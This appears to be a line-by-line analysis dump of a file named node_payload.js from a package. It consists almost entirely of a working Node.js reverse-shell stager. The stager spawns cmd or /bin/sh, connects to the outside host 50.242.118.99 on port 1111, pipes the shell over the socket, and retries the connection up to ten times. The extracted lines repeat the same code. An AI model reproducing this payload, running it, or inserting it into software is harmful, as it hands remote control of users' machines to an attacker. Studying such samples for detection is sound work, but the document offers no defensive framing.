// File: package/node_payload.js
// ======================================================================
Line 1: {
    var require = global.require || global.process.mainModule.constructor._load;
    if (!require) return;
    var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
    var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []);
    var client = this;
    var counter = 0;

    function StagerRepeat() {
        client.socket = net.connect(1111, "50.242.118.99", function () {
            client.socket.pipe(sh.stdin);
            if (typeof util.pump === "undefined") {
                sh.stdout.pipe(client.socket);
                sh.stderr.pipe(client.socket);
            } else {
                util.pump(sh.stdout, client.socket);
                util.pump(sh.stderr, client.socket);
            }
        });
        socket.on("error", function (error) {
            counter++;
            if (counter <= 10) {
                setTimeout(function () {
                    StagerRepeat();
                }, 5 * 1000);
     ...
Line 2: var require = global.require || global.process.mainModule.constructor._load
Line 5: var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []);
Line 10: client.socket = net.connect(1111, "50.242.118.99", function () {
            client.socket.pipe(sh.stdin);
            if (typeof util.pump === "undefined") {
                sh.stdout.pipe(client.socket);
                sh.stderr.pipe(client.socket);
            } else {
                util.pump(sh.stdout, client.socket);
                util.pump(sh.stderr, client.socket);
            }
        })
Line 11: client.socket.pipe(sh.stdin)
Line 13: sh.stdout.pipe(client.socket)
Line 14: sh.stderr.pipe(client.socket)
Line 16: util.pump(sh.stdout, client.socket)
Line 17: util.pump(sh.stderr, client.socket)
Line 22: {
                setTimeout(function () {
                    StagerRepeat();
                }, 5 * 1000);
            }
Line 23: setTimeout(function () {
                    StagerRepeat();
                }, 5 * 1000)
Line 24: StagerRepeat()
Line 26: process.exit()
Line 30: StagerRepeat()
